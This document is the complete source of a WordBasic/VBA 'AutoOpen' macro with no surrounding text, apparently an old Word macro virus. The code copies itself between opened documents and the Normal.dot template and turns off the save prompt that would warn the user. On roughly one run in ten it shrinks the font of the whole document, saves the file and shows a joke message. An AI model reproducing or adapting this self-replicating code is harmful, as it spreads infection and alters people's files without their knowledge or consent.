   Attribute VB_Name = "AutoOpen"

   Public Sub Main()
   Dim a$
   Dim b$
   On Error GoTo -1: On Error GoTo c
   WordBasic.ScreenUpdating 0
   a$ = WordBasic.[FileName$]()
   b$ = "Global:AutoOpen"
   If LCase(WordBasic.[Right$](a$, 3)) = "doc" Then
     a$ = a$ + ":AutoOpen"
     If LCase(WordBasic.[Right$](WordBasic.[MacroFileName$]("AutoOpen"), 10)) = "normal.dot" Then
       WordBasic.MacroCopy b$, a$, 1
       WordBasic.FileSaveAs Format:=1
     Else
       WordBasic.MacroCopy a$, b$, 1
       WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
     End If
     If Rnd() < 0.1 Then
       WordBasic.EditSelectAll
       WordBasic.ShrinkFont
       WordBasic.StartOfDocument
       WordBasic.FileSave
       WordBasic.MsgBox "Be sure to drink your Ovaltine.", "", -1
     End If
   End If
   c:
   On Error GoTo -1: On Error GoTo 0
   End Sub
